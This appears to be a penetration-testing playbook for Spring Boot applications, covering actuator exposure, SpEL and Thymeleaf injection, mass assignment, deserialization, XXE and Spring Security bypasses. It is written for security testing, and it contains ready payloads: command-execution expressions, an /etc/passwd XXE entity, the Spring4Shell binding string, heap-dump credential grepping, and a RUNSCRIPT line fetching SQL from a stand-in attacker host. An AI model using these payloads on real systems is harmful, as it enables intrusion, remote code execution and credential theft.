---
name: spring_boot
description: Security testing playbook for Spring Boot applications covering actuator exposure, SpEL injection, deserialization, and Spring Security misconfiguration
mitre_techniques: [T1190, T1505.003]
kill_chain_phases: [initial_access, persistence]
---

# Spring Boot

Security testing for Spring Boot applications. Focus on actuator endpoint exposure, Spring Expression Language injection, Jackson deserialization RCE, mass assignment via data binding, and Spring Security authorization gaps.

## Attack Surface

**Core Components**
- Controllers: `@RestController`, `@Controller`, `@RequestMapping`, `@GetMapping`/`@PostMapping`
- Spring Security: filter chain, `SecurityFilterChain`, `@PreAuthorize`, `@Secured`, `@RolesAllowed`
- Data binding: `@ModelAttribute`, `@RequestBody` (Jackson), `@RequestParam`, `@PathVariable`
- Template engines: Thymeleaf, FreeMarker, Velocity (legacy), JSP

**Data Handling**
- Jackson: `ObjectMapper`, polymorphic type handling, `@JsonTypeInfo`, custom deserializers
- JPA/Hibernate: `@Query` (JPQL/native), `EntityManager.createNativeQuery()`, Criteria API
- Spring Data: repository method naming, `@Query` annotation, `Specification` API
- Validation: `@Valid`, `@Validated`, Bean Validation (JSR 380), custom validators

**Channels**
- HTTP (Servlet/Reactive), WebSocket (`@MessageMapping`), STOMP, SSE
- Scheduled tasks (`@Scheduled`), async methods (`@Async`), message listeners (JMS/Kafka/RabbitMQ)

**Deployment**
- Embedded Tomcat/Jetty/Undertow, WAR deployment, Docker, Kubernetes, Spring Cloud

## High-Value Targets

- Actuator endpoints: `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/configprops`
- H2 console: `/h2-console/` (embedded database with web UI)
- Swagger/OpenAPI: `/swagger-ui.html`, `/swagger-ui/`, `/v3/api-docs`, `/v2/api-docs`
- Spring Boot Admin: `/applications`, `/instances`
- Spring Cloud Config: `/actuator/refresh`, `/{application}/{profile}`, config server endpoints
- Auth endpoints: login, OAuth2 authorization, token endpoints
- File upload/download endpoints, report generators
- Admin controllers with `@PreAuthorize("hasRole('ADMIN')")`

## Reconnaissance

**Actuator Discovery**
```
GET /actuator
GET /actuator/env
GET /actuator/mappings
GET /actuator/configprops
GET /actuator/beans
GET /actuator/heapdump
GET /actuator/info
GET /actuator/health
GET /actuator/loggers
GET /actuator/threaddump
GET /actuator/scheduledtasks
GET /manage/env          (custom management context path)
GET /admin/env
```

`/actuator/mappings` reveals all registered request mappings (complete route map). `/actuator/env` exposes environment properties (database URLs, API keys — values partially masked but extractable). `/actuator/heapdump` contains full JVM heap including credentials, session tokens, encryption keys.

**Endpoint Mapping Extraction**
```
GET /actuator/mappings     → all @RequestMapping, handler methods, URL patterns
GET /v3/api-docs           → OpenAPI spec with schemas, security definitions
GET /swagger-ui/           → interactive API documentation
GET /actuator/configprops  → all configuration properties and their sources
```

**Version Detection**
- `/actuator/info` may expose `git.commit`, `build.version`, Spring Boot version
- Error pages: default whitelabel error page reveals Spring Boot
- Response headers: `X-Application-Context` (older versions)

## Key Vulnerabilities

### Actuator Endpoint Exposure

**Critical Endpoints**
- `/actuator/env` — environment properties, database credentials, API keys (masked but bypassable via POST to `/actuator/env` to set `spring.cloud.bootstrap.location` for exfiltration)
- `/actuator/heapdump` — full JVM heap dump: extract with `jhat` or Eclipse MAT for credentials, sessions, keys
- `/actuator/mappings` — complete URL mapping including hidden/internal endpoints
- `/actuator/configprops` — all configuration beans and properties
- `/actuator/loggers` — change log levels at runtime (POST to enable DEBUG logging)
- `/actuator/jolokia` — JMX over HTTP, potential RCE via MBean operations
- `/actuator/gateway/routes` — Spring Cloud Gateway route definitions

**Heapdump Exploitation**
```bash
# Download and analyze heap dump
curl -o heapdump http://target/actuator/heapdump
# Search for credentials
strings heapdump | grep -i "password\|secret\|key\|token"
# Use Eclipse MAT for structured analysis
```

**Environment Property Extraction**
- Masked values (`******`) can be exposed via:
  - `/actuator/env` POST to set `management.endpoint.env.keys-to-sanitize` to empty
  - Property source ordering exploitation
  - Heapdump analysis for plaintext values

### SpEL Injection

**Spring Expression Language**
```java
// Vulnerable patterns
@Value("#{${user.input}}")
@PreAuthorize("hasRole(#role)")  // if role comes from user input
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(userInput).getValue();
```

**Exploitation**
```
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.ProcessBuilder).new({'cat','/etc/passwd'}).start()}
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

**Common Injection Points**
- Error messages with SpEL resolution
- Spring Cloud: `spring.cloud.function.routing-expression`
- Spring Data query derivation with SpEL in `@Query`
- View name resolution: controller returning user-controlled view names with SpEL prefix

### Mass Assignment (Data Binding)

**Jackson Binding**
```json
// POST /api/users — intended fields: name, email
// Attack: include unauthorized fields
{"name": "user", "email": "u@x.com", "role": "ADMIN", "enabled": true, "id": 1}
```

- `@RequestBody` with `@JsonIgnoreProperties` not configured: all JSON fields bound to POJO
- `@ModelAttribute` binds all request parameters to object fields including nested properties
- Spring Data REST: PATCH requests can modify fields not exposed in the resource representation

**Nested Property Binding (CVE-2022-22965 / Spring4Shell)**
```
class[module][classLoader][resources][context][parent][pipeline][first][pattern]=...
```
- `@ModelAttribute` allows binding to nested properties via dot notation
- Class loader manipulation leading to RCE via Tomcat AccessLogValve

### Spring Security Misconfiguration

**Filter Chain Gaps**
- `permitAll()` on paths that should be authenticated
- Ant pattern vs MVC pattern mismatches: `/admin/**` vs `/admin` (trailing slash)
- Missing `.authenticated()` on new endpoints added after initial security config
- Multiple `SecurityFilterChain` beans with overlapping or conflicting patterns

**Method Security**
- `@PreAuthorize` using SpEL with insufficient validation
- `@Secured` roles missing `ROLE_` prefix convention mismatch
- Method security not enabled: `@EnableMethodSecurity` / `@EnableGlobalMethodSecurity` absent
- `@PostAuthorize` allowing data access before authorization check

**CSRF Handling**
- CSRF disabled globally for REST APIs but session-based auth still used
- CSRF token not required for state-changing GET requests (misconfigured)
- `CookieCsrfTokenRepository` without `withHttpOnlyFalse()` — CSRF token inaccessible to JavaScript

### Thymeleaf SSTI

**Server-Side Template Injection**
```java
// Vulnerable: user input in template resolution
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    // document = "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
}
```

**Exploitation via View Name**
```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\A').next()}__::.x
```

- Thymeleaf preprocessor expressions `__${...}__` evaluated before template resolution
- Controller methods returning user-controlled strings as view names
- Fragment expressions with user input: `~{::${userInput}}`

### H2 Console Exposure

**Remote Access**
```
GET /h2-console/
```
- Embedded H2 database console enabled in production (`spring.h2.console.enabled=true`)
- Default: no authentication or default credentials
- JDBC URL manipulation: connect to remote databases, file-based databases
- RCE via `CREATE ALIAS` with Java code, `RUNSCRIPT FROM 'http://attacker/evil.sql'`

### Deserialization RCE

**Jackson Polymorphic Typing**
- `@JsonTypeInfo(use = Id.CLASS)` or `enableDefaultTyping()` — arbitrary class instantiation
- Gadget chains: Commons Collections, Spring beans, JNDI lookup classes
- `ObjectMapper` with `DefaultTyping.EVERYTHING` or `NON_FINAL`

**Java Deserialization**
- `ObjectInputStream` usage in custom endpoints, RMI, JMX
- Spring Session with Java serialization
- Redis/Memcached session stores with Java serialization

**JNDI Injection**
- `spring.datasource.url` with `jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://...'`
- LDAP/RMI JNDI lookups in logging (Log4Shell if Log4j2 present)
- Spring Cloud Config: `spring.cloud.config.uri` pointing to attacker server

### JDBC / JPQL Injection

**Native Query Injection**
```java
// Vulnerable
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)
entityManager.createNativeQuery("SELECT * FROM t WHERE id = " + id)
```

**JPQL Injection**
```java
// Vulnerable
entityManager.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")
```

- `@Query` with string concatenation instead of `:param` placeholders
- `Specification` implementations building predicates from unsanitized input
- Spring Data dynamic query methods with `@Param` but using SpEL in `@Query`

### XXE in XML Parsing

**XML Endpoints**
- `@RequestBody` with `application/xml` content type — Jackson XML or JAXB processing
- `@Consumes(MediaType.APPLICATION_XML_VALUE)` on REST endpoints
- SOAP endpoints if CXF/Axis integrated
- File upload parsing (XLSX, SVG, DOCX contain XML)

**Exploitation**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

### LDAP Injection

**Spring LDAP**
```java
// Vulnerable
ldapTemplate.search("ou=users", "(uid=" + username + ")", attrs)
// Injection: username = "admin)(|(objectClass=*)"
```

- `LdapTemplate` with string-concatenated filters
- Spring Security LDAP authentication with unsanitized bind DN

### Spring Cloud Config Exposure

**Config Server**
```
GET /{application}/{profile}
GET /{application}/{profile}/{label}
GET /{application}-{profile}.yml
GET /{application}-{profile}.properties
```
- Unauthenticated access to configuration containing credentials, API keys, database URLs
- `/actuator/refresh` to force config reload from attacker-controlled source
- Path traversal in label parameter to read arbitrary files from Git backend

## Bypass Techniques

- Trailing slash: `/admin` vs `/admin/` — Spring Security Ant patterns may not match both
- Path parameter injection: `/admin;jsessionid=x` — semicolon treated as parameter separator by Tomcat
- URL encoding: `/admin/%2e%2e/actuator` — double encoding bypassing security filters
- Method override: `X-HTTP-Method-Override`, `_method` parameter for method-restricted endpoints
- Content-type switching: `application/json` to `application/xml` to trigger XXE
- Case sensitivity: `/Admin` vs `/admin` (depends on OS and servlet container)

## Testing Methodology

1. **Actuator audit** — Probe all actuator endpoints, check for heapdump, env, mappings access
2. **Route mapping** — Extract full route map from `/actuator/mappings` or Swagger
3. **Security config** — Test each endpoint across unauth/user/admin roles, check filter chain ordering
4. **Binding analysis** — Send extra fields in request bodies to detect mass assignment
5. **SpEL probing** — Test error messages, view names, query parameters for SpEL evaluation
6. **Template injection** — Test Thymeleaf view name resolution with `__${...}__` payloads
7. **Deserialization** — Check Jackson config for polymorphic typing, test XML endpoints for XXE

## Validation Requirements

- Actuator exposure: sensitive data extracted from `/actuator/env`, `/actuator/heapdump`, or `/actuator/configprops`
- SpEL injection: expression evaluated server-side with output confirmation (arithmetic or command execution)
- Mass assignment: unauthorized field (role, admin flag) accepted and persisted via binding
- Thymeleaf SSTI: preprocessor expression executed in view name resolution
- H2 console: database access or code execution via console endpoint
- Deserialization RCE: crafted payload triggering gadget chain execution
- JDBC injection: SQL error or unauthorized data via concatenated native query
- XXE: external entity resolved returning file contents or triggering SSRF
- Spring Security bypass: request reaching protected endpoint via path normalization or method override
